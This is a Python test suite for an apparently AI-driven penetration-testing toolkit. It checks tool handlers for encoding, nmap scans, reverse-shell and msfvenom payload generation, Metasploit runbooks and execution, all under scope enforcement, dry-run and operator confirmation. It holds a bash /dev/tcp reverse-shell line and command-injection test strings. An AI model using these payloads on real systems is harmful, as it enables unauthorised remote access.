"""Tool handlers: registry consistency, utilities, scope enforcement, dry-run."""
from __future__ import annotations

import base64
import json
import os
import unittest
from unittest.mock import patch

from hackgpt import config as C
from hackgpt.config import ScopeDenied
from hackgpt.tools import (
    HANDLERS,
    TOOLS,
    ToolError,
    h_encode,
    h_file_write,
    h_hash_info,
    h_mitm_audit,
    h_mitm_demo,
    h_msf_catalog,
    h_msf_exec,
    h_msf_payload,
    h_msf_plan,
    h_nmap,
    h_note,
    h_payload_gen,
    h_report,
    h_scope,
    h_shell,
    h_tls_cert,
    h_web_dirs,
    h_dns_snapshot,
)

from .helpers import make_ctx


def _b64url(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")


class Registry(unittest.TestCase):
    def test_schemas_match_handlers(self):
        names = [t["function"]["name"] for t in TOOLS]
        self.assertEqual(len(names), len(set(names)), "duplicate tool schemas")
        self.assertEqual(set(names), set(HANDLERS), "schema/handler mismatch")

    def test_required_args_present(self):
        for schema in TOOLS:
            fn = schema["function"]
            props = fn["parameters"]["properties"]
            for req in fn["parameters"]["required"]:
                self.assertIn(req, props, f"{fn['name']}: required '{req}' not in properties")


class Encode(unittest.TestCase):
    def test_base64_roundtrip(self):
        ctx = make_ctx()
        enc = h_encode({"input": "hello world", "op": "encode", "codec": "base64"}, ctx)
        self.assertEqual(enc, "aGVsbG8gd29ybGQ=")
        self.assertEqual(ctx.session["actions"][-1]["tool"], "encode")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "base64"}, ctx), "hello world")

    def test_hex_roundtrip(self):
        ctx = make_ctx()
        enc = h_encode({"input": "ABC", "op": "encode", "codec": "hex"}, ctx)
        self.assertEqual(enc, "414243")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "hex"}, ctx), "ABC")

    def test_url_roundtrip(self):
        ctx = make_ctx()
        enc = h_encode({"input": "a b&c=d", "op": "encode", "codec": "url"}, ctx)
        self.assertEqual(enc, "a%20b%26c%3Dd")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "url"}, ctx), "a b&c=d")

    def test_rot13(self):
        ctx = make_ctx()
        enc = h_encode({"input": "hello", "codec": "rot13"}, ctx)
        self.assertEqual(enc, "uryyb")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "rot13"}, ctx), "hello")

    def test_jwt_decode(self):
        ctx = make_ctx()
        token = _b64url('{"alg":"HS256","typ":"JWT"}') + "." + \
                _b64url('{"sub":"123","admin":true}') + ".c2ln"
        out = h_encode({"input": token, "op": "decode", "codec": "jwt"}, ctx)
        self.assertIn('"admin":true', out)
        self.assertIn("signature:", out)

    def test_jwt_encode_rejected(self):
        with self.assertRaises(ToolError):
            h_encode({"input": "x", "op": "encode", "codec": "jwt"}, make_ctx())

    def test_bad_codec_and_op(self):
        with self.assertRaises(ToolError):
            h_encode({"input": "x", "codec": "nope"}, make_ctx())
        with self.assertRaises(ToolError):
            h_encode({"input": "x", "op": "sideways"}, make_ctx())

    def test_b64_tolerates_missing_padding(self):
        ctx = make_ctx()
        self.assertEqual(h_encode({"input": "aGVsbG8", "op": "decode", "codec": "base64"}, ctx), "hello")


class HashInfo(unittest.TestCase):
    def test_md5(self):
        out = h_hash_info({"hash": "5d41402abc4b2a76b9719d911017c592"}, make_ctx())
        self.assertIn("MD5", out)
        self.assertIn("NTLM", out)

    def test_sha256(self):
        out = h_hash_info({"hash": "a" * 64}, make_ctx())
        self.assertIn("SHA256", out)

    def test_bcrypt(self):
        out = h_hash_info({"hash": "$2b$12$" + "a" * 53}, make_ctx())
        self.assertIn("bcrypt", out)

    def test_unknown(self):
        out = h_hash_info({"hash": "zzz"}, make_ctx())
        self.assertIn("no known format", out)

    def test_empty(self):
        with self.assertRaises(ToolError):
            h_hash_info({"hash": ""}, make_ctx())


class PayloadGen(unittest.TestCase):
    def test_bash_contains_endpoint(self):
        ctx = make_ctx()
        out = h_payload_gen({"type": "bash", "lhost": "10.0.0.5", "lport": "4444"}, ctx)
        self.assertIn("10.0.0.5", out)
        self.assertIn("4444", out)
        self.assertEqual(ctx.session["actions"][-1]["tool"], "payload_gen")

    def test_base64_wrap(self):
        ctx = make_ctx()
        out = h_payload_gen({"type": "bash", "lhost": "1.2.3.4", "lport": "9", "base64": True}, ctx)
        encoded = out.splitlines()[-1]
        self.assertEqual(base64.b64decode(encoded).decode(), f"bash -i >& /dev/tcp/1.2.3.4/9 0>&1")

    def test_output_file(self):
        ctx = make_ctx()
        out = h_payload_gen({"type": "nc", "lhost": "1.2.3.4", "lport": "9", "output": "p.sh"}, ctx)
        path = os.path.join(ctx.output_dir, "p.sh")
        self.assertTrue(os.path.exists(path))
        self.assertIn(path, ctx.session["artifacts"])
        self.assertIn("saved ->", out)

    def test_unknown_type(self):
        with self.assertRaises(ToolError):
            h_payload_gen({"type": "nope", "lhost": "1.2.3.4", "lport": "9"}, make_ctx())


class ShellAndScope(unittest.TestCase):
    def test_shell_runs(self):
        ctx = make_ctx()
        out = h_shell({"command": "echo hello-hackgpt"}, ctx)
        self.assertIn("rc=0", out)
        self.assertIn("hello-hackgpt", out)

    def test_shell_dry_run(self):
        ctx = make_ctx(dry_run=True)
        self.assertEqual(h_shell({"command": "echo hi"}, ctx), "[dry-run] would run: echo hi")

    def test_shell_requires_command(self):
        with self.assertRaises(ToolError):
            h_shell({}, make_ctx())


class Nmap(unittest.TestCase):
    def test_unknown_profile(self):
        with self.assertRaises(ToolError):
            h_nmap({"target": "127.0.0.1", "profile": "bogus"}, make_ctx(scope=["127.0.0.1"]))

    def test_out_of_scope(self):
        with self.assertRaises(ScopeDenied):
            h_nmap({"target": "127.0.0.1"}, make_ctx(scope=[]))

    def test_dry_run(self):
        out = h_nmap({"target": "127.0.0.1", "profile": "quick"},
                     make_ctx(scope=["127.0.0.1"], dry_run=True))
        self.assertIn("[dry-run] would scan:", out)

    def test_enforcement_disabled(self):
        out = h_nmap({"target": "127.0.0.1", "profile": "quick"},
                     make_ctx(scope=[], enforce=False, dry_run=True))
        self.assertIn("[dry-run] would scan:", out)


class NoteAndScope(unittest.TestCase):
    def test_note_records(self):
        ctx = make_ctx()
        h_note({"text": "found creds", "category": "credential", "host": "10.0.0.9"}, ctx)
        self.assertEqual(ctx.session["findings"][0]["category"], "credential")
        self.assertEqual(ctx.session["credentials"][0]["host"], "10.0.0.9")

    def test_scope_lifecycle(self):
        ctx = make_ctx()
        h_scope({"action": "add", "target": "example.com"}, ctx)
        self.assertIn("IN scope", h_scope({"action": "check", "target": "example.com"}, ctx))
        self.assertTrue(C.target_in_scope("example.com", C.load_config()["scope"]))
        h_scope({"action": "remove", "target": "example.com"}, ctx)
        self.assertFalse(C.target_in_scope("example.com", ctx.config["scope"]))

    def test_scope_bad_action(self):
        with self.assertRaises(ToolError):
            h_scope({"action": "explode"}, make_ctx())


class Artifacts(unittest.TestCase):
    def test_file_write(self):
        ctx = make_ctx()
        out = h_file_write({"path": "note.txt", "content": "hello"}, ctx)
        path = os.path.join(ctx.output_dir, "note.txt")
        self.assertTrue(os.path.exists(path))
        self.assertIn(path, ctx.session["artifacts"])
        self.assertIn("wrote 5 bytes", out)

    def test_report_save(self):
        ctx = make_ctx()
        h_note({"text": "finding one"}, ctx)
        out = h_report({"action": "save"}, ctx)
        path = os.path.join(ctx.output_dir, "report-t.md")
        self.assertTrue(os.path.exists(path))
        self.assertIn("report saved ->", out)
        with open(path, encoding="utf-8") as fh:
            self.assertIn("finding one", fh.read())


class NetworkToolsDryRun(unittest.TestCase):
    def test_web_dirs_dry_run(self):
        ctx = make_ctx(scope=["example.com"], dry_run=True)
        out = h_web_dirs({"url": "example.com"}, ctx)
        self.assertIn("[dry-run] would probe", out)

    def test_web_dirs_out_of_scope(self):
        with self.assertRaises(ScopeDenied):
            h_web_dirs({"url": "example.com"}, make_ctx(scope=[]))

    def test_tls_cert_dry_run(self):
        ctx = make_ctx(scope=["example.com"], dry_run=True)
        out = h_tls_cert({"target": "example.com"}, ctx)
        self.assertIn("[dry-run] would fetch", out)

    def test_tls_cert_requires_target(self):
        with self.assertRaises(ToolError):
            h_tls_cert({}, make_ctx(scope=["example.com"]))

    def test_web_dirs_wordlist_missing(self):
        ctx = make_ctx(scope=["example.com"])
        with self.assertRaises(ToolError):
            h_web_dirs({"url": "example.com", "wordlist": "nope.txt"}, ctx)


class DnsSnapshot(unittest.TestCase):
    def test_reports_changes_against_persisted_snapshot(self):
        ctx = make_ctx(scope=["example.com"])
        rows = [type("Row", (), {"__getitem__": lambda self, k: ("192.0.2.10", 0)[0]})()]
        with patch("hackgpt.tools.socket.getaddrinfo", return_value=[(0, 0, 0, "", ("192.0.2.10", 0))]):
            first = h_dns_snapshot({"domain": "example.com"}, ctx)
        self.assertIn("baseline created", first)
        with patch("hackgpt.tools.socket.getaddrinfo", return_value=[(0, 0, 0, "", ("192.0.2.11", 0))]):
            second = h_dns_snapshot({"domain": "example.com"}, ctx)
        self.assertIn("added: 192.0.2.11", second)
        self.assertIn("removed: 192.0.2.10", second)

    def test_requires_scope(self):
        with self.assertRaises(ScopeDenied):
            h_dns_snapshot({"domain": "example.com"}, make_ctx(scope=[]))

    def test_dry_run_does_not_write(self):
        ctx = make_ctx(scope=["example.com"], dry_run=True)
        self.assertIn("[dry-run]", h_dns_snapshot({"domain": "example.com"}, ctx))


class MetasploitCatalog(unittest.TestCase):
    def test_search_uses_auxiliary_catalog_only(self):
        ctx = make_ctx()
        proc = type("Proc", (), {"stdout": "auxiliary/scanner/http/title\\n", "stderr": "", "returncode": 0})()
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/msfconsole"):
            with patch("hackgpt.tools.subprocess.run", return_value=proc) as run:
                out = h_msf_catalog({"action": "search", "query": "http title"}, ctx)
        self.assertIn("auxiliary/scanner/http/title", out)
        self.assertIn("type:auxiliary", run.call_args.args[0][-1])
        self.assertEqual(ctx.session["actions"][-1]["tool"], "msf_catalog")

    def test_rejects_module_execution(self):
        with self.assertRaises(ToolError):
            h_msf_catalog({"action": "run", "query": "exploit/multi/handler"}, make_ctx())

    def test_search_query_rejects_command_separators(self):
        with self.assertRaises(ToolError):
            h_msf_catalog({"action": "search", "query": "http; exploit"}, make_ctx())

    def test_search_type_selectable(self):
        ctx = make_ctx()
        proc = type("Proc", (), {"stdout": "exploit/multi/handler\n", "stderr": "", "returncode": 0})()
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/msfconsole"):
            with patch("hackgpt.tools.subprocess.run", return_value=proc) as run:
                out = h_msf_catalog({"action": "search", "query": "handler", "type": "exploit"}, ctx)
        self.assertIn("type:exploit", run.call_args.args[0][-1])
        self.assertIn("exploit/multi/handler", out)

    def test_bad_type_rejected(self):
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/msfconsole"):
            with self.assertRaises(ToolError):
                h_msf_catalog({"action": "search", "query": "x", "type": "nope"}, make_ctx())


class _Proc:
    def __init__(self, stdout: str = "", stderr: str = "", returncode: int = 0):
        self.stdout = stdout
        self.stderr = stderr
        self.returncode = returncode


class _FakeResp:
    status_code = 200
    headers: dict = {}
    content = b"<html></html>"
    text = ""


class _FakeHTTPClient:
    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False

    def get(self, *args, **kwargs):
        return _FakeResp()


class MitmAudit(unittest.TestCase):
    def test_requires_target(self):
        with self.assertRaises(ToolError):
            h_mitm_audit({}, make_ctx(scope=["example.com"]))

    def test_out_of_scope(self):
        with self.assertRaises(ScopeDenied):
            h_mitm_audit({"target": "example.com"}, make_ctx(scope=[]))

    def test_dry_run(self):
        ctx = make_ctx(scope=["example.com"], dry_run=True)
        out = h_mitm_audit({"target": "example.com"}, ctx)
        self.assertIn("[dry-run] would run a read-only MITM-resilience audit", out)

    def test_missing_openssl(self):
        with patch("hackgpt.tools.C.which", return_value=None):
            with self.assertRaises(ToolError):
                h_mitm_audit({"target": "example.com"}, make_ctx(scope=["example.com"]))

    def test_parses_posture_and_records_findings(self):
        ctx = make_ctx(scope=["example.com"])
        sclient = ("Protocol  : TLSv1.2\n"
                   "Cipher    : ECDHE-RSA-AES256-GCM-SHA384\n"
                   "Verify return code: 0 (ok)\n"
                   "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n")
        x509 = ("Subject: CN = example.com\n"
                "Issuer: CN = Example CA\n"
                "Not After : Nov 15 12:00:00 2027 GMT\n"
                "Signature Algorithm: sha256WithRSAEncryption\n"
                "X509v3 Subject Alternative Name:\n"
                "    DNS:example.com\n")

        def fake_run(cmd, **kwargs):
            return _Proc(stdout=x509 if "x509" in cmd else sclient)

        with patch("hackgpt.tools.C.which", return_value="/usr/bin/openssl"):
            with patch("hackgpt.tools.subprocess.run", side_effect=fake_run):
                with patch("hackgpt.tools._http_client", return_value=_FakeHTTPClient()):
                    out = h_mitm_audit({"target": "example.com"}, ctx)
        self.assertIn("MITM resilience audit — example.com:443", out)
        # every protocol probe succeeds against the mock -> legacy versions reported
        self.assertIn("legacy TLS versions accepted", out)
        self.assertEqual(ctx.session["actions"][-1]["tool"], "mitm_audit")
        texts = "\n".join(f.get("text", "") for f in ctx.session["findings"])
        self.assertIn("HSTS header missing", texts)
        self.assertTrue(any(f.get("severity") == "high" for f in ctx.session["findings"]))

    def test_unreachable_endpoint_rates_unknown(self):
        ctx = make_ctx(scope=["example.com"])
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/openssl"):
            with patch("hackgpt.tools.subprocess.run", return_value=_Proc(stdout="", stderr="connect: Connection refused", returncode=1)):
                out = h_mitm_audit({"target": "example.com"}, ctx)
        self.assertIn("UNKNOWN", out)
        self.assertIn("handshake failed", out)


class MitmDemo(unittest.TestCase):
    def test_synthetic_only(self):
        ctx = make_ctx()
        out = h_mitm_demo({}, ctx)
        self.assertIn("SYNTHETIC", out)
        self.assertIn("DETECTION AND DEFENSE", out)
        self.assertEqual(ctx.session["actions"][-1]["tool"], "mitm_demo")


class MsfPayload(unittest.TestCase):
    def test_missing_binary(self):
        with patch("hackgpt.tools.C.which", return_value=None):
            with self.assertRaises(ToolError):
                h_msf_payload({"payload": "linux/x64/meterpreter/reverse_tcp",
                               "lhost": "1.2.3.4", "lport": "4444"}, make_ctx())

    def test_builds_command_and_saves_artifact(self):
        ctx = make_ctx()
        out_path = os.path.join(ctx.output_dir, "msf-payload-4444.elf")
        with open(out_path, "w", encoding="utf-8"):
            pass  # simulate msfvenom output file
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/msfvenom"):
            with patch("hackgpt.tools.subprocess.run",
                       return_value=_Proc(stdout="Payload size: 120")) as run:
                out = h_msf_payload({"payload": "linux/x64/meterpreter/reverse_tcp",
                                     "lhost": "1.2.3.4", "lport": "4444", "format": "elf"}, ctx)
        cmd = run.call_args.args[0]
        self.assertIn("-p", cmd)
        self.assertIn("linux/x64/meterpreter/reverse_tcp", cmd)
        self.assertIn("LHOST=1.2.3.4", cmd)
        self.assertIn("LPORT=4444", cmd)
        self.assertIn("-f", cmd)
        self.assertIn(out_path, out)
        self.assertIn(out_path, ctx.session["artifacts"])

    def test_rejects_injection(self):
        with self.assertRaises(ToolError):
            h_msf_payload({"payload": "linux/x64/meterpreter/reverse_tcp; id",
                           "lhost": "1.2.3.4", "lport": "4444"}, make_ctx())

    def test_dry_run_previews_command(self):
        ctx = make_ctx(dry_run=True)
        out = h_msf_payload({"payload": "linux/x64/meterpreter/reverse_tcp",
                             "lhost": "1.2.3.4", "lport": "4444"}, ctx)
        self.assertIn("[dry-run] would generate:", out)


class MsfPlan(unittest.TestCase):
    def test_writes_runbook(self):
        ctx = make_ctx(scope=["127.0.0.1"])
        out = h_msf_plan({"module": "exploit/multi/handler", "rhosts": "127.0.0.1",
                          "lhost": "10.0.0.2"}, ctx)
        path = os.path.join(ctx.output_dir, "msf-runbook.rc")
        self.assertTrue(os.path.exists(path))
        with open(path, encoding="utf-8") as fh:
            body = fh.read()
        self.assertIn("use exploit/multi/handler", body)
        self.assertIn("set RHOSTS 127.0.0.1", body)
        self.assertIn("set LHOST 10.0.0.2", body)
        self.assertIn(path, ctx.session["artifacts"])
        self.assertIn("runbook written ->", out)

    def test_out_of_scope_rhosts(self):
        with self.assertRaises(ScopeDenied):
            h_msf_plan({"module": "exploit/multi/handler", "rhosts": "example.com"},
                       make_ctx(scope=[]))

    def test_invalid_module(self):
        with self.assertRaises(ToolError):
            h_msf_plan({"module": "exploit/a b", "rhosts": "127.0.0.1"},
                       make_ctx(scope=["127.0.0.1"]))

    def test_lhost_newline_rejected(self):
        with self.assertRaises(ToolError):
            h_msf_plan({"module": "exploit/multi/handler", "rhosts": "127.0.0.1",
                        "lhost": "1.2.3.4\nset X evil"}, make_ctx(scope=["127.0.0.1"]))

    def test_dry_run_does_not_write(self):
        ctx = make_ctx(scope=["127.0.0.1"], dry_run=True)
        out = h_msf_plan({"module": "exploit/multi/handler", "rhosts": "127.0.0.1"}, ctx)
        self.assertIn("[dry-run] would write runbook", out)
        self.assertFalse(os.path.exists(os.path.join(ctx.output_dir, "msf-runbook.rc")))


class MsfExec(unittest.TestCase):
    def _rc(self, ctx, rhosts="127.0.0.1"):
        path = os.path.join(ctx.output_dir, "msf-run.rc")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(f"use exploit/multi/handler\nset RHOSTS {rhosts}\nrun\n")
        return path

    def test_disabled_by_default(self):
        ctx = make_ctx(scope=["127.0.0.1"])
        self._rc(ctx)
        with self.assertRaises(ToolError) as cm:
            h_msf_exec({"rc": "msf-run.rc"}, ctx)
        self.assertIn("disabled", str(cm.exception))

    def test_out_of_scope_rhosts(self):
        ctx = make_ctx(scope=[])
        ctx.config["msf_execute"] = True
        self._rc(ctx, rhosts="10.1.1.1")
        with self.assertRaises(ScopeDenied):
            h_msf_exec({"rc": "msf-run.rc"}, ctx)

    def test_dry_run(self):
        ctx = make_ctx(scope=["127.0.0.1"], dry_run=True)
        ctx.config["msf_execute"] = True
        self._rc(ctx)
        out = h_msf_exec({"rc": "msf-run.rc"}, ctx)
        self.assertIn("[dry-run] would run: msfconsole -q -r", out)

    def test_confirm_cancel(self):
        ctx = make_ctx(scope=["127.0.0.1"])
        ctx.config["msf_execute"] = True
        ctx.console.confirm = lambda prompt: False
        self._rc(ctx)
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/msfconsole"):
            out = h_msf_exec({"rc": "msf-run.rc"}, ctx)
        self.assertEqual(out, "cancelled by operator")

    def test_runs_script(self):
        ctx = make_ctx(scope=["127.0.0.1"])
        ctx.config["msf_execute"] = True
        self._rc(ctx)
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/msfconsole"):
            with patch("hackgpt.tools.subprocess.run",
                       return_value=_Proc(stdout="session opened")) as run:
                out = h_msf_exec({"rc": "msf-run.rc", "timeout": 5}, ctx)
        self.assertIn("rc=0", out)
        self.assertIn("session opened", out)
        self.assertEqual(run.call_args.args[0][:2], ["/usr/bin/msfconsole", "-q"])
        self.assertEqual(ctx.session["actions"][-1]["tool"], "msf_exec")


if __name__ == "__main__":
    unittest.main()
